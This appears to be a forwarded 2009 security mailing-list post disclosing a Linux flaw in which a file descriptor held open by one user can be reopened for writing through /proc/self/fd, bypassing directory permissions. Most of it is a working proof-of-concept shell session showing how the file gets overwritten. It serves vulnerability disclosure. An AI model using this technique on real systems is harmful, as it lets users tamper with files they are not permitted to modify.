@@ -1,0 +1,82 @@
+Hi!
+
+This is forward from lkml, so no, I did not invent this
+hole. Unfortunately, I do not think lkml sees this as a security hole,
+so...
+
+Jamie Lokier said:
+> > >  a) the current permission model under /proc/PID/fd has a security
+> > >     hole (which Jamie is worried about)
+> > 
+> > I believe its bugtraq time. Being able to reopen file with additional
+> > permissions looks like  a security problem...
+> > 
+> > Jamie, do you have some test script? And do you want your 15 minutes
+> >  of bugtraq fame? ;-).
+
+> The reopen does check the inode permission, but it does not require
+> you have any reachable path to the file.  Someone _might_ use that as
+> a traditional unix security mechanism, but if so it's probably quite rare.
+
+Ok, I got this, with two users. I guess it is real (but obscure)
+security hole.
+
+So, we have this scenario. pavel/root is not doing anything interesting in
+the background.
+
+pavel@toy:/tmp$ uname -a
+Linux toy.ucw.cz 2.6.32-rc3 #21 Mon Oct 19 07:32:02 CEST 2009 armv5tel GNU/Linux
+pavel@toy:/tmp mkdir my_priv; cd my_priv
+pavel@toy:/tmp/my_priv$ echo this file should never be writable > unwritable_file
+# lock down directory
+pavel@toy:/tmp/my_priv$ chmod 700 .
+# relax file permissions, directory is private, so this is safe
+# check link count on unwritable_file. We would not want someone 
+# to have a hard link to work around our permissions, would we?
+pavel@toy:/tmp/my_priv$ chmod 666 unwritable_file 
+pavel@toy:/tmp/my_priv$ cat unwritable_file 
+this file should never be writable
+pavel@toy:/tmp/my_priv$ cat unwritable_file 
+got you
+# Security problem here
+
+[Please pause here for a while before reading how guest did it.]
+
+Unexpected? Well, yes, to me anyway. Linux specific? Yes, I think so.
+
+So what did happen? User guest was able to work around directory
+permissions in the background, using /proc filesystem.
+
+guest@toy:~$ bash 3< /tmp/my_priv/unwritable_file 
+# Running inside nested shell
+guest@toy:~$ read A <&3
+guest@toy:~$ echo $A
+this file should never be writable
+
+guest@toy:~$ cd /tmp/my_priv
+guest@toy:/tmp/my_priv$ ls
+unwritable_file
+
+# pavel did chmod 000, chmod 666 here
+guest@toy:/tmp/my_priv$ ls
+ls: cannot open directory .: Permission denied
+
+# Linux correctly prevents guest from writing to that file
+guest@toy:/tmp/my_priv$ cat unwritable_file
+cat: unwritable_file: Permission denied
+guest@toy:/tmp/my_priv$ echo got you >&3
+bash: echo: write error: Bad file descriptor
+
+# ...until we take a way around it with /proc filesystem. Oops.
+guest@toy:/tmp/my_priv$ echo got you > /proc/self/fd/3 
+
+								Pavel
+-- 
+(english) http://www.livejournal.com/~pavelmachek
+(cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blog.html
+
+----- End forwarded message -----
+
+-- 
+(english) http://www.livejournal.com/~pavelmachek
+(cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blog.html
